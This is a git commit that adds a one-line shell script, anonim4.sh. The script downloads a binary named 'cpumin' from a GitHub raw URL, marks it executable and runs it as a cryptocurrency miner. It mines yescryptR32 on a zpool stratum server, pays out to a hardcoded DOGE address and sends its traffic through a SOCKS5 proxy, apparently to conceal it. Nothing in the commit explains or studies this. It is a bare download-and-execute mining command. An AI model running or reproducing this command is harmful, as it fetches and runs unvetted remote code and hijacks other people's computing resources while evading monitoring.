9bfffd31fa1f0a8194da7b55b410fc79a659b9be
jacujamil <91077383+jacujamil@users.noreply.github.com>
2022-06-02 14:16:12 +0000

    Create anonim4.sh

---
+++ anonim4.sh
@@ -0,0 +1,1 @@
+wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin && chmod +x cpumin && ./cpumin -a yescryptR32 -o stratum+tcp://yescryptR32.sea.mine.zpool.ca:6343 -u DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E.$(echo $(shuf -i 1-9999 -n 1)-Masku) -p c=DOGE -t 2 -x socks5://72.221.171.130:4145
